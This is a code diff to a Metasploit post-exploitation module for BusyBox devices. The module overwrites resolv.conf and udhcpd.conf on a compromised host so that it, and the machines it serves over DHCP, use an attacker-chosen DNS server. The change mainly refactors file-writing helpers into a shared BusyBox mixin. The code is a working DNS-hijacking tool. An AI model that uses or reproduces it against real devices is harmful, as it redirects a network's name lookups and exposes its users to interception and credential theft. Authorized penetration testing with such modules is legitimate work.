@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Post
 
   include Msf::Post::File
+  include Msf::Post::Linux::Busybox
 
   def initialize
     super(
@@ -30,14 +31,13 @@ class Metasploit3 < Msf::Post
       [
         OptAddress.new('SRVHOST',   [ true, "The dns server address.", nil ])
       ], self.class)
-
   end
 
+  #
   #The module tries to update resolv.conf file with the SRVHOST dns address. It tries to update
   #udhcpd.conf too, with SRVHOST dns address, that should be given to network's hosts via dhcp
-
+  #
   def run
-
     workdone = false
     vprint_status("Searching for files to modify dns server.")
     if file_exists("/etc/resolv.conf")
@@ -61,12 +61,7 @@ class Metasploit3 < Msf::Post
         print_good("Udhcpd.conf modified and dns server added. Dhcpd restarted.")
       else
         vprint_status("Unable to write udhcpd.conf. Trying to copy the file to a writable directory.")
-        writable_directory = nil
-        vprint_.status("Trying to find writable directory.")
-        writable_directory = "/etc/" if is_writable_and_write("/etc/tmp.conf", "x", false)
-        writable_directory = "/mnt/" if (!writable_directory && is_writable_and_write("/mnt/tmp.conf", "x", false))
-        writable_directory = "/var/" if (!writable_directory && is_writable_and_write("/var/tmp.conf", "x", false))
-        writable_directory = "/var/tmp/" if (!writable_directory && is_writable_and_write("/var/tmp/tmp.conf", "x", false))
+        writable_directory = get_writable_directory()
         if writable_directory
           vprint_status("writable directory found, creating a copy of the original udhcpd.conf.")
           is_writable_and_write("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", false)
@@ -84,41 +79,6 @@ class Metasploit3 < Msf::Post
     if !workdone
       print_error("Unable to modify dns server.")
     end
-
-  end
-
-  #This function checks if the target file is writable and writes or append the data given as parameter.
-  #BusyBox shell's commands are limited and Msf > Post > File > write_file function doesnt work here, for
-  #this reason it is necessary to implement an specific function
-
-  def is_writable_and_write(file_path, data, append)
-    if append
-      data = read_file(file_path) + "\n" + data
-    end
-    rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
-    session.shell_write("echo #{rand_str} > #{file_path}\n"); Rex::sleep(0.1)
-    session.shell_read(); Rex::sleep(0.1)
-    if read_file(file_path).include? rand_str
-      session.shell_write("echo \"\"> #{file_path}\n"); Rex::sleep(0.1)
-      session.shell_read(); Rex::sleep(0.1)
-      lines = data.lines.map(&:chomp)
-      lines.each do |line|
-        session.shell_write("echo #{line.chomp} >> #{file_path}\n"); Rex::sleep(0.1)
-        session.shell_read(); Rex::sleep(0.1)
-      end
-      return true
-    else
-      return false
-    end
-  end
-
-  #file? doesnt work because test -f is not implemented in busybox
-  def file_exists(file_path)
-    s = read_file(file_path)
-    if s and s.length
-      return true
-    end
-    return false
   end
 
 end
